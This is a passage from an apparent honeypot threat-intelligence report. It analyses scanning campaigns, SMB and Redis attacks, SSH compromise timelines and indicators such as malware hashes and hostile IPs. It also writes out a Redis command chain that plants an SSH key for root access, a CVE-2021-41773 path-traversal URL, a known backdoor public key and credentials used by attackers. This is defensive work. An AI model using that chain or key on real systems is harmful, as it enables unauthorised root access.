| `/level/15/exec/-/sh/run/CR` | 2 | **Cisco IOS privileged mode command execution** |
| `/manager/html` | 2 | Apache Tomcat manager (default creds) |
| `/manager/status` | 2 | Apache Tomcat status page |

**Notable paths:**

-   `/cgi-bin/.%2e/.../.../bin/sh` - This is URL-encoded path traversal (`..` as `%2e%2e`) exploiting CVE-2021-41773 to reach the system shell via CGI. 12 hits confirm active exploitation attempts.
-   `/portal/redlion` - Red Lion Controls is an industrial HMI/SCADA manufacturer. Probing for their management panel on an internet-facing honeypot is an ICS targeting indicator.
-   `/level/15/exec/-/sh/run/CR` - This path is specific to **Cisco IOS HTTP server exec commands**. Level 15 is the highest privilege level in Cisco IOS — this is an attempt to execute shell commands via the Cisco device's HTTP management interface.
-   `/developmentserver/metadatauploader` - SAP NetWeaver development server metadata uploader endpoint - a known attack vector against SAP enterprise systems.
-   `/HNAP1/` - D-Link HNAP (Home Network Administration Protocol) is vulnerable to a range of authentication bypass and RCE exploits (multiple CVEs).

**Top User-Agents from Tanner (from Splunk):**

| User-Agent | Count | Classification |
| --- | --- | --- |
| `Mozilla/5.0 zgrab/0.x` | 20 | Zgrab — banner grabbing scanner (confirmed live in current logs) |
| `Mozilla/5.0 (iPhone; iOS 13.2.3...)` | 12 | Mobile UA masking — Tencent/Alibaba cloud scanner pattern |
| `libredtail-http` | 12 | Custom Python scanner (confirmed POST requests — live) |
| `Go-http-client/1.1` | 10 | Go-based automated scanner |
| `curl/7.68.0` | 6 | Curl — direct scripted probing |
| `python-requests/2.32.5` | 4 | Python scanner |
| `Hello from Palo Alto Networks...` | 6 | Cortex Xpanse — legitimate internet asset scanning service |
| `ivre-masscan/1.3` | 2 | IVRE framework with Masscan — confirmed Masscan active in current logs |

> **Masscan confirmed in current Tanner logs:** The `ivre-masscan/1.3` User-Agent appearing in `sourcetype=tanner:json` provides direct Splunk-queryable evidence of Masscan in the current log window — supplementing the pre-rotation SMTP HELO banner detection noted in §7.1.

**MITRE ATT&CK (web layer):** T1190 (Exploit Public-Facing Application), T1083 (File and Directory Discovery), T1046 (Network Service Discovery), T1592 (Gather Victim Host Information)

---

## 11\. Coordinated Attack Campaigns

### Campaign Gamma - IONOS SE VPS Fleet (31.70.64.0/18)

The most definitively attributed single-actor campaign in the dataset. Nine IPs across the IONOS SE AS8560 netblock generated a combined **5,015 attack events**, all exclusively via Suricata — consistent with systematic port scanning and exploit probing rather than application-layer interaction.

| IP | Attack Count | VT Detection | Suspicious Flags | DNS Resolutions |
| --- | --- | --- | --- | --- |
| 31.70.75.115 | 1,824 | 3/91 | 2 | 1 |
| 31.70.89.209 | 1,272 | 3/91 | 1 | 1 |
| 31.70.75.109 | 285 | 3/91 | 2 | 1 |
| 31.70.75.117 | 284 | 5/91 | 2 | 1 |
| 31.70.78.114 | 281 | 5/91 | 2 | 1 |
| 31.70.78.222 | 277 | 6/91 | 3 | 1 |
| 31.70.75.104 | 257 | 5/91 | 3 | 1 |
| 31.70.75.118 | 275 | 6/91 | 3 | 1 |
| 31.70.77.205 | 260 | 3/91 | 1 | 1 |
| **TOTAL** | **5,015** |  |  |  |

**Attribution indicators:**

-   All 9 IPs are in the same /18 subnet (IONOS SE, AS8560, Germany)
-   Consistent detection profiles across all nodes (3–6 malicious, 1–3 suspicious flags each)
-   Every IP has exactly **1 DNS resolution** — a fleet provisioning pattern, not organic hosting
-   All traffic is Suricata-only — systematic scan/probe, no application-layer engagement
-   No SSL certificates on any node — bare compute instances with no legitimate workload

**Assessment:** A single threat actor operating a cheap VPS fleet on IONOS SE, likely provisioned via a reseller or compromised account. The uniform detection profile and consistent single-DNS-resolution pattern across 9 nodes strongly suggests automated provisioning from a common management framework. **Recommended action:** Block the entire 31.70.64.0/18 CIDR to neutralise the full cluster regardless of which specific IPs are active at any time.

---

## 12\. Human Behaviour Analysis

### 12.1 IP 40.112.183.29 - Microsoft Azure (US) - Confirmed Human Operator

**Observed sessions on 2026-05-22:**

| Time (UTC) | Command | Inter-command gap |
| --- | --- | --- |
| 00:29:12 | `w` | — |
| 00:29:13 | `top` | ~1 second |
| 00:40:35 | `w` | **~11 minutes** |
| 00:40:38 | `top` | ~3 seconds |
| 00:46:42 | `w` | **~6 minutes** |
| 00:46:44 | `top` | ~2 seconds |

Three separate sessions, each opened, executing the same `w` / `top` pair, then closing. The **11-minute and 6-minute gaps** between sessions are entirely inconsistent with automated tooling — these represent a human returning to the terminal, checking system state (logged-in users and CPU load), then stepping away.

**Analysis:** `w` shows who is logged in and what they're running. `top` shows CPU/process load. This combination is the standard triage pair a human uses when checking: "Is this server being used? Is there heavy load?" — indicating the operator was assessing resource availability, possibly evaluating the system for cryptomining or determining if their prior compromise was still active. The Azure IP context suggests a compromised cloud VM being used as a pivot.

### 12.2 IP 172.214.209.153 - Microsoft Azure (US) - Semi-Automated with Human Direction

While the subsequent payload download appears scripted, the credential used (`root/Tk123456@`) is a **non-trivial, complex password** that suggests either targeted credential use or a high-quality wordlist, not a default credential scanner.

**Session timeline:**

| Time (UTC) | Event |
| --- | --- |
| 09:43:37 | Login success - root/Tk123456@ |
| 09:43:37 | File download - hash `01ba4719...` |
| 09:43:37 | File download - hash `a8460f44...` |

The simultaneous download of both payloads within the same second of login suggests a pre-staged shell script that executes immediately on successful authentication.

---

## 13\. DoublePulsar / SMB Exploitation Campaign

### 13.1 Overview

Port 445 (SMB) was the single most targeted port with **95,656 Suricata events**. The primary attack signature was **DoublePulsar (MS17-010 / EternalBlue)** — the NSA-derived exploit leaked by Shadow Brokers in 2017 that remains one of the most widely used exploitation tools on the internet.

### 13.2 Top 15 DoublePulsar Source IPs

| Rank | IP Address | Events | Country (est.) |
| --- | --- | --- | --- |
| 1 | 41.89.238.217 | 1,637 | KE (Kenya) |
| 2 | 180.253.180.231 | 1,614 | ID (Indonesia) |
| 3 | 196.188.109.42 | 1,608 | ET (Ethiopia) |
| 4 | 118.69.61.88 | 1,595 | VN (Vietnam) |
| 5 | 77.79.134.84 | 1,574 | TR (Turkey) |
| 6 | 103.148.89.154 | 1,565 | PH (Philippines) |
| 7 | 2.63.248.49 | 1,562 | RU (Russia) |
| 8 | 171.251.48.54 | 1,515 | VN (Vietnam) |
| 9 | 113.161.145.33 | 1,505 | VN (Vietnam) |
| 10 | 103.207.14.99 | 1,501 | PH (Philippines) |
| 11 | 14.249.204.32 | 1,467 | CN (China) |
| 12 | 178.175.68.23 | 1,461 | DE (Germany) |
| 13 | 36.78.148.136 | 1,393 | ID (Indonesia) |
| 14 | 190.104.218.218 | 1,374 | BO (Bolivia) |
| 15 | 187.137.13.245 | 1,338 | MX (Mexico) |

### 13.3 201.216.239.205 - Detailed Actor Profile

This IP (Argentina) appears in both the top 15 overall attackers list AND the SMB category. Its Suricata signature breakdown:

| Signature | Count |
| --- | --- |
| SURICATA STREAM spurious retransmission | 14 |
| ET INFO Potentially unsafe SMBv1 protocol in use | 4 |
| ET EXPLOIT Possible ETERNALBLUE Probe MS17-010 (Generic Flags) | 3 |
| ET EXPLOIT Possible ETERNALBLUE Probe MS17-010 (MSF style) | 3 |
| GPL NETBIOS SMB-DS IPC$ share access | 3 |
| GPL NETBIOS SMB-DS IPC$ unicode share access | 3 |
| SURICATA STREAM FIN recv but no session | 1 |
| SURICATA STREAM Packet with broken ack | 1 |

The "MSF style" variant indicates **Metasploit-generated EternalBlue probes** — the attacker is using the Metasploit Framework's MS17-010 module. The IPC$ share access attempts following the probe suggest the actor progresses to enumeration when the probe lands. All 5,722 events from this IP targeted **port 445 exclusively**.

---

## 14\. Redis Honeypot Activity

### 14.1 Top 10 Redis Attacking IPs

| Rank | IP Address | Events | Notes |
| --- | --- | --- | --- |
| 1 | 8.210.133.68 | 491 | Alibaba Cloud (HK) — dominant Redis attacker |
| 2 | 18.116.101.220 | 51 | AWS US-East |
| 3 | 47.83.139.186 | 30 | Alibaba Cloud |
| 4 | 117.72.125.91 | 26 | CN |
| 5 | 43.161.255.54 | 26 | CN |
| 6 | 49.51.70.13 | 26 | CN |
| 7 | 192.210.150.44 | 21 | US |
| 8 | 45.95.147.229 | 20 | EU VPS |
| 9 | 16.58.56.214 | 18 | AWS |
| 10 | 18.218.118.203 | 18 | AWS US-East |

### 14.2 Analysis

Redis is a primary target for **cryptomining deployment**. A commonly observed Redis attack chain:

1.  Connect to unauthenticated/weakly-authenticated Redis on port 6379
2.  Use `CONFIG SET dir /root/.ssh` + `CONFIG SET dbfilename authorized_keys` + `SET crackit [SSH_PUBLIC_KEY]` + `BGSAVE`
3.  Gain passwordless SSH root access via the written key

The dominance of Alibaba Cloud IPs (8.210.133.68, 47.83.139.186) and multiple AWS IPs confirms this is primarily **cloud-to-cloud attack traffic** - compromised cloud instances probing for other exposed cloud services. The GCP IPs logging Redis AUTH probes on the Cowrie port (34.53.197.105, 34.78.127.216) confirm cross-service probe misrouting is common.

---

## 15\. Reconstructed Attack Timelines

### 15.1 Timeline - 81.9.145.130 (Turkey) - Full Exploitation Chain

| Timestamp (UTC) | Activity | ATT&CK Technique | Technique ID | Tactic |
| --- | --- | --- | --- | --- |
| 2026-05-24 11:53:02 | Successful login using `root / online@2025` | Valid Accounts | T1078 | Initial Access |
| 2026-05-24 11:53:02 | Interactive SSH session established | Remote Services: SSH | T1021.004 | Lateral Movement |
| 2026-05-24 11:53:02 | Host and environment reconnaissance | System Information Discovery | T1082 | Discovery |
| 2026-05-24 11:53:02 | Host and environment reconnaissance | System Owner/User Discovery | T1033 | Discovery |
| 2026-05-24 11:53:02 | Download of primary payload (`a8460f44...`) | Ingress Tool Transfer | T1105 | Command and Control |
| 2026-05-24 11:53:02 | Download of secondary payload (`01ba4719...`) | Ingress Tool Transfer | T1105 | Command and Control |
| 2026-05-24 11:53:02 | SSH key injection (`mdrfckr` backdoor) | SSH Authorized Keys | T1098.004 | Persistence |
| 2026-05-24 11:53:02 | SSH key injection (`mdrfckr` backdoor) | Account Manipulation | T1098 | Persistence |
| 2026-05-24 11:53:02 | Removal of competing malware | Indicator Removal on Host | T1070 | Defense Evasion |
| 2026-05-24 11:53:02 | Removal of competing malware/processes | File and Directory Discovery | T1083 | Discovery |
| 2026-05-24 12:05:38 | Reuse of external infrastructure (`197.140.11.157`) to download payload | Ingress Tool Transfer | T1105 | Command and Control |
| 2026-05-24 12:32:43 | Successful login using `git / git@123` | Valid Accounts | T1078 | Initial Access |
| 2026-05-24 12:32:43 | Re-download of payload (`a8460f44...`) | Ingress Tool Transfer | T1105 | Command and Control |
| 2026-05-24 12:32:43 | Re-download of payload (`01ba4719...`) | Ingress Tool Transfer | T1105 | Command and Control |

### 15.2 Timeline - 197.140.11.157 (Morocco) - Full Exploitation Chain

| Timestamp (UTC) | Activity | ATT&CK Technique | Technique ID | Tactic |
| --- | --- | --- | --- | --- |
| 2026-05-24 10:36:00 | Successful login using `git / git@123` | Valid Accounts | T1078 | Initial Access |
| 2026-05-24 10:36:00 | Interactive SSH session established | Remote Services: SSH | T1021.004 | Lateral Movement |
| 2026-05-24 10:36:00 | Initial reconnaissance/probing activity (no payload deployment observed) | System Information Discovery | T1082 | Discovery |
| 2026-05-24 12:05:47 | Successful login using `root / online@2025` | Valid Accounts | T1078 | Initial Access |
| 2026-05-24 12:05:47 | Download of primary payload (`a8460f44...`) | Ingress Tool Transfer | T1105 | Command and Control |
| 2026-05-24 12:27:51 | Additional SSH session established | Remote Services: SSH | T1021.004 | Lateral Movement |
| 2026-05-24 12:27:51 | Re-download of primary payload (`a8460f44...`) | Ingress Tool Transfer | T1105 | Command and Control |
| 2026-05-24 12:27:51 | Download of secondary payload (`01ba4719...`) | Ingress Tool Transfer | T1105 | Command and Control |
| 2026-05-24 12:27:51 | Payload re-staging and execution preparation | Command and Scripting Interpreter: Unix Shell | T1059.004 | Execution |

---

## 16\. Threat Indicators of Compromise (IOCs)

### 16.1 Malware Hashes

**Cowrie - SSH/Telnet Payloads (SHA256)**

| Hash | MD5 | VT | Family | Source |
| --- | --- | --- | --- | --- |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | a420f7a60a40f3ff3a806a01feb1dfda | 33/61 | SSH authorized\_keys backdoor | Cowrie session file\_download |
| `7aa7aae39a8ea974d4fd49a67b794cbe5b60b4ca66657f4cd1ddc9b5ae758042` | — | Not in VT | Novel sample | Cowrie |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | 68b329da9893e34099c7d8ad5cb9c940 | 0/35 | Newline artifact | Cowrie session file\_download |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | b0dd49d5caf8d5efe0337d30776708b1 | 36/61 | Linux Miner dropper stub | Cowrie SFTP upload |
| `51e3f833985cfd9c2c96e4086bb2dbdaf36373c23d3b8f897c7076346b646be0` | 7ff2071eda093f78b9d2d53c7e927af9 | 35/64 | Mirai + XMRig Miner | Cowrie SFTP upload |
| `3f711f010ee63dd3a089cff847c5443a0bdd5d63c49e956e4d3bc5cb922f9462` | 95fba7c318d846837b9fe14e86d7cb2a | 37/61 | Linux Miner variant | Cowrie SFTP upload |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | — | 0/61 | Shell probe artifact | Cowrie |
| `4355a46b19d348dc2f57c046f8ef63d4538ebb936000f3c9ee954a27460dd865` | — | 0/61 | Connection probe artifact | Cowrie |
| `983755ac9112bdf7487e53017fd2f14af59c0537bcad36ec302d92563636df70` | 0e0aa1397faa7da231133511d3b9f930 | 37/65 | Linux Miner (Mar 2026) | Cowrie SFTP upload |
| `57c9a1386f10bd2baec86bb2a0624dcf1b1be53b0f4bc8ac5c76244d7dc35baf` | b1c1ac6cfd88546d4188ecc9c522e23e | 36/64 | Linux Backdoor (Casdet) | Cowrie |
| `ad955f2fc192c74bbab93a06edd77a4691fe3cd95d255f94664f5ac87674c283` | — | 0/56 | Command string artifact | Cowrie |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | 107c2e790ae6ccef1c521878a6a61868 | 33/64 | Trojanized sshd + CoinMiner | Cowrie SFTP upload |
| `e15e93db3ce3a8a22adb4b18e0e37b93f39c495e4a97008f9b1a9a42e1fac2b0` | 9a111588a7db15b796421bd13a949cd4 | **47/62** | **Gafgyt/Mozi IoT Botnet (ARM UPX)** | Cowrie — highest confidence |
| `9ac3924fa98c4788086eec79aad88a6e23d222f72cdf3a55d477cd87e9cb6402` | 283f4f19fecf769144721294d62ab6ef | 37/62 | Linux Miner (Apr 2026) | Cowrie SFTP upload |
| `9bcc07ffabb4eec587fdc9ab75e4fd86a3bfabd0acdc32a0dd56cd4cec589e1d` | 9cf1a1c464003f66f41a8ca4872591c3 | 35/65 | Linux Miner (APT1 YARA hit) | Cowrie SFTP upload |
| `f7a2eec2362d4a0afae13d683986b7c0bae04c1e62ca826307d796d18184eefd` | — | Not in VT | Novel sample | Cowrie |
| `9bd8cae28e75623a1e1d0c94419edc8f922c5967c935549adfbab47b6f12c810` | 245ab8a5a805a0d9e08f7f3478baea3e | 35/64 | Linux Miner | Cowrie SFTP upload |
| `a2720a89ac6bd6cdd087a4bd0ed4b6a97037cbf4d2c3d0a4abbf8aa0a3b7d017` | c437c054cbe4ff0bb6ad194588a75f8c | 37/65 | Linux Miner (shared VHash cluster) | Cowrie SFTP upload |
| `467c7ed2badbf51cf9383eda657a9470511b7bdd66962503bf230d503f727aa8` | 37aea59e5980ce0e9bdcbece90c5a30b | 35/53 | XMRig Miner (CLI args confirmed) | Cowrie SFTP upload |
| `d7f98e379c400c13340781ccb65017c000330824ea26680866b9d3e43d641721` | a6a0777570e673784c2bae7125c718f7 | 36/64 | Linux CoinMiner (May 2026) | Cowrie SFTP upload |
| `93d73931235e659020f96b63b8b4ce7392bde807731c8506fd48893ba3fea88e` | — | Not in VT | Novel sample | Cowrie |

**ADBHoney - Android Debug Bridge Payloads (SHA256)**

| Hash | MD5 | VT | Family | Notes |
| --- | --- | --- | --- | --- |
| `26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc` | 1c8c10167970b4447ebb46a2d977f61a | 14/62 | AdbMiner helper (`endat`) | First seen Aug 2018 |
| `71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5` | 0cbd0588eb1124a9d35410d260e7d8ae | 39/64 | AdbMiner Trojan (ARM ELF) | Detect-debug-environment; drops 3 files |
| `d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0` | 9a10ba1d64a02ee308cd6479959d2db2 | 37/65 | Dropper disguised as `nohup` | Drops 20 files; execution parent cluster |
| `697e4904339fc76cc9879b7fdcd1d67d96654b33beb06769d92a78c8fa87f028` | 0ccb595d7508967e72aa3bf59c1d97ee | 31/61 | Active Threat | **First seen** 4 days before capture; C2: 176.65.139.3 |
| `a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437` | 8a9b94910275355998db5994fd3e579a | 2/62 | PDF Exploit + DLL Injection | AcroRd32.exe delivery; wevtutil evasion; Yomi: MALWARE |
| `0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257` | 8844985fcd57b0311d1d4cb2ec13a1ef | 48/67 | **com.ufo.miner.apk** (Android) | Contacts coinhive.com; Monero miner APK |
| `76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64` | be4d7087f6e0de471f2d4760a6e79859 | 40/64 | AdbMiner Spreader (ARM ELF) | Tagged `spreader`; shared campaign cluster |
| `63946c28efa919809c03be75a3937c4be80589a9df79cd1be72037d493b70857` | b2976ce2e2c5c5b27d8b3debbf9a8b13 | 36/64 | AdbMiner Spreader variant | Same VHash as `76ae6d57`; same campaign |

**Dionaea - EternalBlue/WannaCry Payloads (MD5)**

| MD5 | VT | Community Score | Notable |
| --- | --- | --- | --- |
| `0ab2aeda90221832167e5127332dd702` | 66/70 (94.3%) | \-209 | Drops 20 files; port sweep + ICMP recon IDS |
| `0cc45d84e00f4345d57e5c36a960b6a2` | 68/72 (94.4%) | 0 | `ntdll.dll` disguise; CVE-2017-0147 |
| `414a3594e4a822cfb97a4326e185f620` | 65/71 (91.5%) | \-130 | Killswitch DNS lookup confirmed by IDS |
| `47bc7c8f1ac38746f74e543a4c421d75` | 62/67 (92.5%) | \-39 | Contacts `.ff` killswitch variant |
| `4f651c3def217c5dd980fcf688c765f6` | 68/72 (94.4%) | 0 | Named `dionaea-nyc1` |
| `5a9e809ef287470a50cef41df8897b62` | 67/71 (94.4%) | \-134 | CVE-2017-0144 + 0147; 4 IDS high alerts |
| `5b764a11b9dd6b0bab4c28f16714c828` | 65/70 (92.9%) | 0 | Contacts `survey-smiles.com` |
| `6350f8da991da9ee85c63e15cce88fbb` | 61/67 (91.0%) | \-66 | Contacts `iuqerfsodp9…` killswitch |
| `6e72ad805b4322612b9c9c7673a45635` | 61/66 (92.4%) | \-121 | IDS: DNS fast flux alert |
| `775930a062cfe16caf9a56513d142262` | 66/72 (91.7%) | \-12 | Contacts Sectigo cert infra |
| `79fae695ec420cb24556f8e48fce4f24` | 65/72 (90.3%) | \-9 | McAfee sig name includes this MD5 |
| `7a473fbd3e762326735a72aed9c37efc` | 64/72 (88.9%) | 0 | McAfee: Ransom-WannaCry!7A473FBD3E76 |
| `996c2b2ca30180129c69352a3a3515e4` | 63/68 (92.6%) | \-89 | **2,653 VT submissions** — most seen in Dionaea set |
| `9aca1d2e2f94c7b2c5a0caf0f222d1b1` | 65/72 (90.3%) | 0 | Named `dionaea-nyc1` |
| `ae12bb54af31227017feffd9598a6f5e` | 66/70 (94.3%) | \-101 | **4,323 VT submissions**; 6 IDS alerts; drops 18 files |
| `af9c055ee083e5168034746b03b1b01f` | 64/70 (91.4%) | 0 | Standard WannaCry variant |
| `c2906a725d83842d3f71c39ef932399f` | 65/70 (92.9%) | \-13 | Tagged `spreader`; EternalBlue MSF probe IDS |
| `c2b3f51728001fbaaa5a73fcaf3e1a68` | 67/72 (93.1%) | \-64 | 482 submissions; drops 3 files |
| `d7fbbdfdaa9cd241c60bd4c3fdc28ff8` | 68/72 (94.4%) | 0 | Named `dionaea-fra1` — Frankfurt node confirmed |
| `e9d1ba0ee54fcdf37cf458cd3209c9f3` | 67/72 (93.1%) | \-82 | Named `ulu9oh.exe`; tagged spreader |
| `fcb6b0f95853dfda72d5535a424b3a29` | 67/71 (94.4%) | \-47 | Named `c5qg9.exe`; VMRay confirmed WannaCry; drops 20+ files |
| `fe4e11212bd62d5690337a28f078eca6` | 67/71 (94.4%) | \-1 | `ntdll.dll` disguise; contacts killswitch domain |

### 16.2 SSH Backdoor Key

```
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
```

**Threat actor tag:** `mdrfckr` - known cryptomining campaign, active since at least 2019.

### 16.3 Credentials Observed in Active Use

| Username | Password | Times Seen | Notes |
| --- | --- | --- | --- |
| root | online@2025 | 2 | Shared between 81.9.145.130 & 197.140.11.157 |
| git | git@123 | 2 | Shared between 81.9.145.130 & 197.140.11.157 |
| root | Tk123456@ | 1 | Campaign initiator — complex credential |
| root | root.1234 | 1 | Common variation |
| root | root4321 | 1 | Common variation |
| root | linux | 1 | Default/trivial |
| ubuntu | a | 1 | Single character — brute-force endpoint |
| ubuntu | 3245gs5662d34 | 1 | Complex password — credential dump source likely |
| mailuser | 12345 | 1 | Default mail server credential |
| root | 12345a | 1 | Sequential variation |

### 16.4 Key IP IOCs

**Priority Block / Report (High Risk)**

| IP | Count | ASN / Country | VT | Threat Type | Action |
| --- | --- | --- | --- | --- | --- |
| 158.94.210.44 | 2,891 | Omegatech AS202412 / 🇳🇱 NL | 20/91 | Bulletproof SMTP attack node; 20 linked malware files (see §16.6) | Block + report |
| 46.151.178.13 | 158 | Sino Worldwide AS211443 / 🇳🇱 NL | 16/91 | Community -50 — highest in dataset; Chinese-affiliated shell ASN | Block immediately |
| 176.65.139.11 | 159 | Offshore LC AS214472 / 🇱🇺 LU | 16/91 | 20 linked malware files; dedicated C2/payload hosting node | Block immediately |
| 176.65.132.242 | 578 | Pfcloud UG AS51396 / 🇩🇪 DE | 20/91 | Bulletproof hosting; auto-generated SSL domain; community -16 | Block |
| 185.91.127.85 | 771 | Tube-Hosting AS49581 / 🇩🇪 DE | 14/91 | Self-signed `localhost` cert expired 2019; bulletproof hosting | Block |
| 160.119.76.49 | 519 | Alsycon B.V. AS49870 / 🇸🇨 SC | 16/91 | Alsycon bulletproof cluster node 1 — block /23 | Block 160.119.76.0/23 |
| 160.119.76.63 | 232 | Alsycon B.V. AS49870 / 🇸🇨 SC | 15/91 | Alsycon cluster node 2; community -7 | Block 160.119.76.0/23 |
| 160.119.76.24 | 212 | Alsycon B.V. AS49870 / 🇸🇨 SC | 13/91 | Alsycon cluster node 3; burner domain SSL | Block 160.119.76.0/23 |
| 185.224.128.16 | 167 | Alsycon B.V. AS49870 / 🇳🇱 NL | 13/91 | Alsycon cluster node 4 — different subnet, same actor | Block 185.224.128.0/24 |
| 104.244.74.84 | 164 | FranTech/BuyVM AS53667 / 🇨🇭 CH | 13/91 | Community -11; linked malware file; privacy hosting abuse | Block |
| 16.58.56.214 | 1,248 | Amazon AWS AS16509 / 🇺🇸 US | 5/91 | Clean attack-only node; 5 malicious votes; no cert/domain | Report to AWS |
| 18.218.118.203 | 1,010 | Amazon AWS AS16509 / 🇺🇸 US | 8/91 | **Cobalt Strike JARM + ICS/SCADA targeting** (see §16.7) | Report to AWS — priority |
| 3.129.187.38 | 951 | Amazon AWS AS16509 / 🇺🇸 US | 5/91 | Cobalt Strike JARM match; 10 DNS resolutions | Report to AWS |
| 3.132.26.232 | 258 | Amazon AWS AS16509 / 🇺🇸 US | 7/91 | **Cobalt Strike JARM + API Gateway fronting** (see §16.8) | Report to AWS — priority |
| 3.130.168.2 | 677 | Amazon AWS AS16509 / 🇺🇸 US | 7/91 | Cobalt Strike JARM profile; SSL for UID API | Report to AWS |
| 40.112.183.29 | 235 | Microsoft Azure AS8075 / 🇺🇸 US | 5/91 | Human recon sessions confirmed; community -9 | Report to Microsoft |
| 40.78.155.180 | 228 | Microsoft Azure AS8075 / 🇺🇸 US | 9/91 | Community -6; same AS8075 block as .183.29 | Report to Microsoft |
| 172.203.149.63 | 197 | Microsoft Azure AS8075 / 🇺🇸 US | 10/91 | Azure Bastion IP flagged malicious | Report to Microsoft |
| 152.52.15.214 | 202 | Bharti Airtel AS9498 / 🇮🇳 IN | 5/91 | **Compromised FortiGate firewall** — SSL cert is FortiGate; RCE victim | Investigate |
| 90.169.216.25 | 176 | Orange Spain AS12479 / 🇪🇸 ES | 9/91 | **Compromised Synology NAS** — artecomp.synology.me | Investigate |
| 151.243.11.35 | 195 | LLC Vash Kredit Bank AS209630 / 🇦🇪 UAE | 11/91 | Russian bank-affiliated UAE-routed ASN; no domain/cert | Block |

**SSH Compromise Actors (from Cowrie)**

| IP | ASN / Country |
| --- | --- |
| 81.9.145.130 | Euskaltel AS12338 / 🇪🇸 ES |
| 197.140.11.157 | Sarl Icosnet AS36891 / 🇩🇿 DZ |
| 172.214.209.153 | Microsoft Azure AS8075 / 🇺🇸 US |
| 38.242.147.245 | Hetzner / 🇩🇪 DE |
| 105.27.148.94 | Kenya / 🇰🇪 KE |
| 120.138.6.3 | 🇳🇿 NZ |

**Coordinated Campaigns**

| IP / CIDR | Count | Action |
| --- | --- | --- |
| 31.70.64.0/18 (9 nodes) | 5,015 combined | Block entire /18 CIDR |
| 160.119.76.0/23 (3 nodes) | 963 combined | Block entire /23 CIDR |
| 185.224.128.0/24 (1 node) | 167 | Block /24 CIDR |

**C2 Network Contacts (from ADBHoney sandbox)**

| Domain / IP | Context |
| --- | --- |
| 176.65.139.3 | ADBHoney hash `697e4904` C2 contact — Dshield + Spamhaus listed |
| coinhive.com | `com.ufo.miner.apk` Monero mining C2 (now defunct/sinkholes) |
| ws015.coinhive.com | Secondary CoinHive mining pool endpoint |
| acroipm.adobe.com | Abused for C2 blending in `a1b6223a` PDF exploit payload |

---

## 17\. VirusTotal IP Enrichment - Full 100-IP Dataset

VirusTotal analysis was performed on all 100 top attacking IPs. Results categorised by risk tier.

**High Risk** 

| IP | Attacks | VT Det. | Community | ASN | Country | Infrastructure | Key Finding |
| --- | --- | --- | --- | --- | --- | --- | --- |
| 46.151.178.13 | 158 | 16/91 | **\-50** | Sino Worldwide AS211443 | 🇳🇱 NL | Bulletproof | Highest community score in dataset; Chinese-affiliated shell ASN |
| 158.94.210.44 | 2,891 | 20/91 | \-15 | Omegatech AS202412 | 🇳🇱 NL | Bulletproof | 20 linked malware files; dedicated SMTP attack node |
| 176.65.139.11 | 159 | 16/91 | \-4 | Offshore LC AS214472 | 🇱🇺 LU | Bulletproof | 20 linked malware files; C2/payload hosting |
| 176.65.132.242 | 578 | 20/91 | \-16 | Pfcloud UG AS51396 | 🇩🇪 DE | Bulletproof | Auto-generated SSL; privacy hosting |
| 160.119.76.63 | 232 | 15/91 | \-7 | Alsycon AS49870 | 🇸🇨 SC | Bulletproof | Alsycon cluster node 2 |
| 160.119.76.49 | 519 | 16/91 | \-3 | Alsycon AS49870 | 🇸🇨 SC | Bulletproof | Alsycon cluster node 1 |
| 160.119.76.24 | 212 | 13/91 | \-3 | Alsycon AS49870 | 🇸🇨 SC | Bulletproof | Alsycon cluster node 3; JARM present |
| 185.224.128.16 | 167 | 13/91 | \-3 | Alsycon AS49870 | 🇳🇱 NL | Bulletproof | Alsycon 4th node; separate subnet |
| 185.91.127.85 | 771 | 14/91 | \-4 | Tube-Hosting AS49581 | 🇩🇪 DE | Bulletproof | `localhost` cert expired 2019 |
| 104.244.74.84 | 164 | 13/91 | \-11 | FranTech AS53667 | 🇨🇭 CH | Privacy hosting | BuyVM; 1 linked malware file |
| 172.203.149.63 | 197 | 10/91 | \-4 | Azure AS8075 | 🇺🇸 US | Cloud | Flagged Azure Bastion IP |
| 151.243.11.35 | 195 | 11/91 | \-3 | Vash Kredit Bank AS209630 | 🇦🇪 UAE | Russian-affiliated | Russian bank ASN via UAE |
| 183.94.33.245 | 228 | 12/91 | \-2 | China Unicom AS4837 | 🇨🇳 CN | ISP | Compromised Unicom node |
| 197.140.11.157 | 211 | 11/91 | \-3 | Icosnet AS36891 | 🇩🇿 DZ | ISP/business | Compromised Algerian business server; SSH actor |
| 40.78.155.180 | 228 | 9/91 | \-6 | Azure AS8075 | 🇺🇸 US | Cloud | Malicious Azure; community -6 |
| 45.198.224.9 | 302 | 14/91 | \-5 | Vpsvault AS215925 | 🇲🇺 MU | Budget VPS | No legitimate use indicators |
| 18.218.118.203 | 1,010 | 8/91 | \-3 | AWS AS16509 | 🇺🇸 US | Cloud | **Cobalt Strike JARM + ICS targeting** |
| 3.132.26.232 | 258 | 7/91 | \-3 | AWS AS16509 | 🇺🇸 US | Cloud | **Cobalt Strike JARM + API Gateway fronting** |
